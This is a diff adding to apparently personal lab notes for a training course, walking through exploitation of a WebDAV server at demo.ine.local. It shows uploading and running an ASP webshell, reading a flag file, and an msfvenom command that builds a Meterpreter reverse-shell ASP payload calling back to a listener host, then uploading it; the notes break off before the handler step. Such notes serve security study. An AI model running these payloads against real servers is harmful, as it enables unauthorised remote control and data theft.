@@ -32,3 +32,14 @@ The first step of the exploitation process will involve identifying whether WebD
 - go to Website and execute the webshell.asp file we have just uploaded
 - `dir C:\`
 - `type C:\flag.txt`
+
+### Practical Exploiting WebDAV With Metasploit
+
+- `nmap -sV -p 80 --script=http-enum demo.ine.local`
+
+**Obtain a Meterpreter session**
+
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.4 LPORT=1234 -f asp > shell.asp` Generate ASP payload
+- `http://10.2.24.226/webdav` afterwards type in username and passwort
+- `put /root/shell.asp` Paste asp file on webserver. The next step would be to connect to the webserver and execute it. But before we can do this, we need a listener or a handler that will receive the reverse connection and then send the stage that will then provide us with the meterpreter session when executed. 
+- 
